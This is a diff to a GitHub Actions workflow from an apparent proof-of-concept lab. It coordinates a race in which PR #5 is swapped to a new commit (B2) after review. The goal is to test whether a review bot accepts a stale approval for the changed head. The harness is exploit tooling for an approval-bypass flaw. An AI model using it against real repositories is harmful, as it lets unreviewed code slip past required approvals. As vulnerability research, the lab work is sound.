@@ -79,7 +79,7 @@ jobs:
             -H 'Accept: application/vnd.github+json' \
             -H 'X-GitHub-Api-Version: 2022-11-28' \
             "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/5/comments" \
-            -d '{"body":"BCR_POC_SYNC_READY: reviewer passed global dismissal wait; externally move PR #5 to commit B now."}' \
+            -d '{"body":"BCR_POC_SYNC_READY_B2: reviewer passed global dismissal wait; externally move PR #5 to single-module commit B2 now."}' \
             >/dev/null
 
           seen_b=0
@@ -89,9 +89,9 @@ jobs:
               -H 'Accept: application/vnd.github+json' \
               -H 'X-GitHub-Api-Version: 2022-11-28' \
               "https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls/5" | jq -r '.head.sha')
-            if [[ "$head_sha" == '2e2f32fc9860f744f2ba769ce3997ab62c299ac6' ]]; then
+            if [[ "$head_sha" == '9905e6513b3ff0c12eedeed080323f1f828493b7' ]]; then
               seen_b=1
-              echo "Observed PR #5 HEAD=B ($head_sha); resuming exact reviewer."
+              echo "Observed PR #5 HEAD=B2 ($head_sha); resuming exact reviewer."
               break
             fi
             sleep 0.1
@@ -100,7 +100,7 @@ jobs:
           if [[ "$seen_b" != 1 ]]; then
             kill "$reviewer_pid" 2>/dev/null || true
             cat reviewer.log
-            echo 'Timed out waiting for PR #5 HEAD=B.' >&2
+            echo 'Timed out waiting for PR #5 HEAD=B2.' >&2
             exit 1
           fi
 
@@ -116,5 +116,5 @@ jobs:
           # A GitHub App token cannot call GET /user, so a later failure there is
           # expected in this lab. The security assertion is whether the unchanged
           # getPrApprovers/checkIfAllModifiedModulesApproved path accepts the stale
-          # approval for HEAD B before that point.
+          # approval for HEAD B2 and reaches allModulesApproved before that point.
           exit 0
